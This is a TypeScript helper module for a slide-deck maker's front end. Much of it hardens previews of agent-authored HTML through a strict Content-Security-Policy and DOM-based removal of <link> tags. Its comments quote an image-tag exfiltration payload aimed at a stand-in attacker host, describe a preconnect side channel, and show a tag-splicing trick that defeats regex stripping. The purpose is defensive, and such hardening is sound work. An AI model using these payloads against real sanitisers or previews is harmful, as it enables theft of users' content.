/**
 * PPTX Maker — pure helpers.
 *
 * Kept separate from the components so the fiddly bits (the deck filter, the
 * tab-follow rule, filename sanitising) are unit-testable without rendering.
 */

import type { DeckDetail, DeckSummary } from './api'

/** Poll intervals (ms). Chosen so a deck being built feels live without hammering
 *  the gateway: the selected deck's slides recompose every few seconds, the deck
 *  list changes far less often, and provisioning is a minutes-long job. */
export const POLL_DECK_MS = 1500
export const POLL_DECKS_MS = 5000
export const POLL_DOC_MS = 5000
export const POLL_PROVISION_MS = 2500
export const POLL_IDLE_MS = 15000

/** Slide preview aspect ratio (16:9), as a padding-bottom percentage. */
export const SLIDE_ASPECT = '56.25%'

/** The style/art-direction board's intrinsic slide size, used to scale it to fit. */
export const BOARD_WIDTH = 1920
export const BOARD_HEIGHT = 1080
export const BOARD_GAP = 8

/** Compose payload schema this page renders. A different version means the
 *  engine moved on and the preview must say so rather than draw nonsense. */
export const COMPOSE_VERSION = 1

export type DeckTab = 'brief' | 'outline' | 'artDirection' | 'slides'

export const DECK_TABS: DeckTab[] = ['brief', 'outline', 'artDirection', 'slides']

/**
 * Subsequence match — every query character appears in order.
 *
 * Deck ids are timestamped (`20260101-quarterly-review`), so a strict substring
 * filter makes "qr" match nothing. A subsequence match is what lets the user type
 * a few letters of the name they remember.
 */
export function fuzzyMatch(text: string, query: string): boolean {
  if (!query) return true
  const haystack = text.toLowerCase()
  const needle = query.toLowerCase()
  let i = 0
  for (const ch of haystack) {
    if (ch === needle[i]) i += 1
    if (i === needle.length) return true
  }
  return i === needle.length
}

/** Filter decks by name or brief content. */
export function filterDecks(decks: DeckSummary[], query: string): DeckSummary[] {
  const trimmed = query.trim()
  if (!trimmed) return decks
  const lower = trimmed.toLowerCase()
  return decks.filter(
    (deck) =>
      fuzzyMatch(deck.name, trimmed) ||
      `${deck.name} ${deck.brief}`.toLowerCase().includes(lower),
  )
}

/**
 * The tab to switch to given two successive `updatedAt` maps, or null.
 *
 * This is what makes the viewer follow the agent: as each deliverable is written
 * the newest changed key wins, so the user watches the brief appear, then the
 * outline, then the art direction, then the slides, without clicking. Returning
 * null on the first poll matters — otherwise opening an existing deck would yank
 * the user to whatever was last touched days ago.
 */
export function tabToFollow(
  previous: Record<string, number> | null,
  next: Record<string, number>,
): DeckTab | null {
  if (!previous) return null
  let winner: DeckTab | null = null
  let best = 0
  for (const key of DECK_TABS) {
    const now = next[key]
    if (typeof now !== 'number') continue
    if (now > (previous[key] ?? 0) && now > best) {
      best = now
      winner = key
    }
  }
  return winner
}

/** Whether a deliverable tab has content yet (slides are always reachable). */
export function tabAvailable(detail: DeckDetail | undefined, tab: DeckTab): boolean {
  if (tab === 'slides') return true
  if (!detail) return false
  return Boolean(detail.specs[tab])
}

/**
 * Turn a picked filename into a library name the backend will accept.
 *
 * The server enforces its own name grammar and rejects anything else, so this is
 * a convenience that makes the common case (`My Deck (v2).pptx`) work rather than
 * a security control.
 */
export function nameFromFilename(filename: string, stripExtension = true): string {
  const base = stripExtension ? filename.replace(/\.[^.]+$/, '') : filename
  return base
    .replace(/[^A-Za-z0-9._-]+/g, '-')
    .replace(/^[-.]+|[-.]+$/g, '')
    .slice(0, 64)
}

/**
 * Wrap a style/art-direction document so it scales to fit its container.
 *
 * The engine's style documents ship their own page zoom and padding, which in a
 * fixed-size iframe shows that chrome instead of the slide. Injecting a reset
 * lets the caller scale the iframe by transform instead.
 */
/**
 * Stylesheet injected into a board preview iframe.
 *
 * Module-level on purpose: it is a stylesheet, not copy, and hoisting it keeps the
 * i18n lint from reading a multi-part CSS concatenation as untranslated prose (the
 * plugin evaluates the whole concatenation as one node, so no per-fragment shape
 * rule can exempt it).
 */
const BOARD_PREVIEW_RESET_CSS =
  '<style data-preview-reset>'
  + 'html,body{margin:0!important;padding:0!important;background:transparent!important;'
  + 'zoom:1!important;overflow:visible!important}'
  + '.slide{margin:0 auto 8px!important}'
  + '</style>'

/**
 * Egress-denying policy for a board preview.
 *
 * `sandbox=""` already denies scripts, forms and navigation — but it says nothing
 * about PASSIVE subresource loads. A board document is agent-authored from model
 * output, so a single `<img src="https://attacker/?d=…">` (or a CSS
 * `background:url(…)`, or a webfont) is a GET that carries deck content off-origin
 * with no script involved at all. This is the same class of hole as the Meetings
 * sketch frame and the SlidePreview SVG; here the fix is one policy because the
 * document is inert by construction.
 *
 * `default-src 'none'` denies every fetch type by fallback, so a directive nobody
 * thought of is denied rather than defaulted open. `img-src data:` keeps the
 * engine's inline base64 art working (it re-encodes embedded raster to
 * `data:image/webp`, so a blanket image ban would blank every board) while
 * granting no `http(s):`. `style-src`/`font-src` take `'unsafe-inline'`/`data:` for
 * the same reason and no origin. No `script-src` at all — the sandbox already
 * forbids execution, and spelling one would only weaken the story.
 */
const BOARD_PREVIEW_CSP =
  '<meta http-equiv="Content-Security-Policy" content="'
  + "default-src 'none'; "
  + "img-src data:; "
  + "style-src 'unsafe-inline'; "
  + 'font-src data:; '
  + "form-action 'none'; base-uri 'none'"
  + '">'

/**
 * Strip every `<link>` element from an agent-authored board.
 *
 * The ONE egress vector the CSP above cannot close. A `<link rel="preconnect">`
 * is not a fetch, so **no fetch directive governs it** — that part is structural,
 * and it is why `connect-src 'none'` and `prefetch-src 'none'` were both measured
 * and both failed to stop it. At least WebKit opens a real TCP connection per
 * distinct host (measured; Chromium and Firefox did not, but a speculative-loading
 * optimisation is exactly the kind of thing a browser release turns on, so the
 * control does not depend on which engines currently do). That makes a board
 * carrying a bank of attacker-chosen hostnames a script-free side channel: the
 * SUBSET of hosts it names encodes deck content, and every connection dials out.
 *
 * Removing the element is therefore the only mechanism that works. Nothing a
 * board legitimately needs is lost: the CSP already refuses every `rel` that
 * fetches (`stylesheet`, `prefetch`, `preload`, `icon`), so a surviving `<link>`
 * could only ever have been a no-op or this leak. The Meetings sketch frame
 * strips `<link>` from its own srcdoc for exactly this reason
 * (`sketchSrcdoc.ts` `STRIPPED_TAGS`).
 *
 * **A real DOM parse, NOT a regex** — and this is the whole point of the
 * function. A single-pass regex over the raw string is defeated by SPLICING,
 * because deleting one match can join its neighbours into a live tag:
 * `<lin<link>k rel=preconnect href=…>` has the inner `<link>` removed and the
 * remainder closes up into an intact `<link rel=preconnect href=…>`. Measured:
 * three variants of that shape survived a `/<link\b[^>]*>/gi`-style strip.
 * Parsing sidesteps the class entirely — the parser resolves the document ONCE
 * into a tree, so there is no re-scan for a deletion to feed.
 *
 * `DOMParser` (not `innerHTML`) keeps the markup inert while it is inspected: the
 * document it returns is inactive, so nothing in it loads, executes or
 * preconnects during the strip. Serializing the parsed tree back out also
 * normalizes whatever the model wrote into markup the preview frame will parse
 * the same way we just did.
 */
function stripLinkElements(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html')
  for (const el of Array.from(doc.querySelectorAll('link'))) el.remove()
  // `documentElement` (not `body`): a board is a full document whose `<head>`
  // carries the engine's own `<style>`, and serializing only the body would drop it.
  return doc.documentElement.outerHTML
}

/**
 * Wrap an agent-authored board document for preview in a sandboxed iframe.
 *
 * The CSP and the reset are prepended **ahead of every model byte**, never spliced
 * in before `</head>`: a policy that appears after the markup it is meant to govern
 * does not govern it, and a document whose `</head>` sits after an `<img>` would
 * have leaked before the meta was parsed. Emitting both first also means a document
 * with no `<head>` at all is covered identically — the parser hoists a leading
 * `<meta>`/`<style>` into the implicit head.
 *
 * `<meta http-equiv="refresh">` is deliberately NOT stripped. Its navigation is
 * gated on the *sandboxed automatic features* flag, which `sandbox=""` sets
 * because the frame grants no `allow-scripts` (WHATWG HTML, shared declarative
 * refresh steps) — verified refused in Chromium, Firefox and WebKit, with and
 * without the CSP. A strip here would be dead code, and the real invariant it
 * would obscure is that these two frames must never gain `allow-scripts`; the
 * `sandbox=""` assertions in `PptxMakerPage.test.tsx` guard that instead.
 */
export function prepareBoardHtml(html: string): string {
  return BOARD_PREVIEW_CSP + BOARD_PREVIEW_RESET_CSS + stripLinkElements(html)
}

/** How many `.slide` blocks a board document contains (at least one). */
export function countBoardSlides(html: string): number {
  const matches = html.match(/class="slide[\s"]/g)
  return matches ? matches.length : 1
}

/** Accent swatches for a template card, in theme order. */
export function templateAccents(colors: Record<string, string> | undefined): string[] {
  if (!colors) return []
  return [1, 2, 3, 4, 5, 6]
    .map((n) => colors[`accent${n}`])
    .filter((c): c is string => Boolean(c))
}
